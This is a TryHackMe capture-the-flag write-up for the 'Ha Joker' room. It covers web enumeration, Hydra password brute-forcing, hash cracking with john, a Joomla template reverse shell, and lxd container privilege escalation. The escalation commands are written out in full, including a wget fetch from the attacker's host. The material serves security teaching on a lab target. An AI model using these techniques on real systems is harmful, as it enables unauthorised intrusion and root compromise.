---
title: "TryHackMe - Ha Joker CTF"
author: Nasrallah
description: ""
date: 2022-11-23 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, lxd, hydra, crack, john, joomla, reverse-shell]
img_path: /assets/img/tryhackme/jokerctf
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Ha Joker CTF](https://tryhackme.com/room/jokerctf) from [TryHackMe](https://tryhackme.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.202.24
Host is up (0.099s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA: Joker
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.29
|_http-title: 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We found 2 open ports, 80 and 8080 both running Apache http web server.

### Web

Let's navigate to port 80.

![](1.png)

There are a bunch of joker's pictures and quotes.

### Gobuster

Let's scan for file and directories with gobuster using the following command:

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://{target_IP}/ -x php,txt
```

```terminal
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.202.24/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2022/08/26 04:56:34 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.202.24/css/]
/img                  (Status: 301) [Size: 310] [--> http://10.10.202.24/img/]
/index.html           (Status: 200) [Size: 5954]                              
/phpinfo.php          (Status: 200) [Size: 94768]                             
/phpinfo.php          (Status: 200) [Size: 94767]                             
/secret.txt           (Status: 200) [Size: 320]                               
/server-status        (Status: 403) [Size: 277]                               
===============================================================

```

We find a secret.txt file, let's check it.

![](2.png)

It's a conversation between `joker` and `batman`.

Let's navigate to port 8080.

![](3.png)

We have to authenticate.

### Hydra

Maybe we can use one of the users we found earlier and brute force the password.

```bash
hydra -l joker -P /usr/share/wordlists/rockyou.txt 10.10.119.22 http-get -s 8080
```

![](4.png)

We found the password, let's login.

![](5.png)

Let's run a directory scan using the following command:

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.119.22:8080 -U joker -P {password}
```

```terminal
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.202.24:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Auth User:               joker
[+] Timeout:                 10s
===============================================================
2022/08/26 05:19:02 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/administrator        (Status: 301) [Size: 327] [--> http://10.10.202.24:8080/administrator/]
/bin                  (Status: 301) [Size: 317] [--> http://10.10.202.24:8080/bin/]          
/cache                (Status: 301) [Size: 319] [--> http://10.10.202.24:8080/cache/]        
/components           (Status: 301) [Size: 324] [--> http://10.10.202.24:8080/components/]   
/images               (Status: 301) [Size: 320] [--> http://10.10.202.24:8080/images/]       
/includes             (Status: 301) [Size: 322] [--> http://10.10.202.24:8080/includes/]     
/index.php            (Status: 200) [Size: 10947]                                            
/language             (Status: 301) [Size: 322] [--> http://10.10.202.24:8080/language/]     
/layouts              (Status: 301) [Size: 321] [--> http://10.10.202.24:8080/layouts/]      
/libraries            (Status: 301) [Size: 323] [--> http://10.10.202.24:8080/libraries/]    
/LICENSE              (Status: 200) [Size: 18092]                                            
/media                (Status: 301) [Size: 319] [--> http://10.10.202.24:8080/media/]        
/modules              (Status: 301) [Size: 321] [--> http://10.10.202.24:8080/modules/]      
/plugins              (Status: 301) [Size: 321] [--> http://10.10.202.24:8080/plugins/]      
/README               (Status: 200) [Size: 4494]                                             
/robots.txt           (Status: 200) [Size: 836]                                              
/robots               (Status: 200) [Size: 836]                                              
/server-status        (Status: 403) [Size: 279]                                              
/templates            (Status: 301) [Size: 323] [--> http://10.10.202.24:8080/templates/]    
/tmp                  (Status: 301) [Size: 317] [--> http://10.10.202.24:8080/tmp/]          
/web.config           (Status: 200) [Size: 1690]                                             
===============================================================

```

We found an administrator page, but we need credentials for it. Here the author of the room says there is a backup file, so i tried going to **/backup** and found the file.

We unzip the file with `unzip backup.zip` but we get prompt for a password. I tried the joker password we found earlier and managed to unzip it.

Inside db directory, we find sql file with a password hash in it. Let's crack it using `john`.

```bash
$ john adminhash.txt --wordlist=/usr/share/wordlists/rockyou.txt        
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
********         (?)     
1g 0:00:00:29 DONE (2022-10-25 04:12) 0.03422g/s 35.72p/s 35.72c/s 35.72C/s bullshit..piolin
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Let's login.

![](6.png)

## **Foothold**

I searched for ways to get a reverse shell in `joomla` and found this [article](https://www.hackingarticles.in/joomla-reverse-shell/) that describes how to do so.

First, go to `Extensions` -> `Templates`.

![](7.png)

Select one of the templates then go the `index.php`.

![](8.png)

We replace the current php code with [Pentest Monkey's reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

![](9.png)

Click `save`, then setup a netcat listener and go back to the web page and click `Template preview` to get a shell.

![](10.png)

## **Privilege Escalation**

We the user `www-data` is part of the `lxd` group.

```terminal
www-data@ubuntu:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```

We can refer to this [article](https://www.hackingarticles.in/lxd-privilege-escalation/) on how to exploit lxd.

First, we need to clone a github repository with the following command. 

```bash
git clone  https://github.com/saghul/lxd-alpine-builder.git
```

Then we setup a http server in lxd-alpine-builder directory to server the archive file.

```bash
sudo python3 -m http.server 80
```

![](11.png)

Now on the compromised machine, we download the archive file with the following command:

```bash
wget http://{tun0_IP}/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

![](12.png)

Now we add an image like this:

```bash
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage 
```

And check if it's been added with:

```bash
lxc image list
```

![](13.png)

Great! Now let's execute the following command successively to get a root shell:

```bash
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

![](14.png)

And just like that we got root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
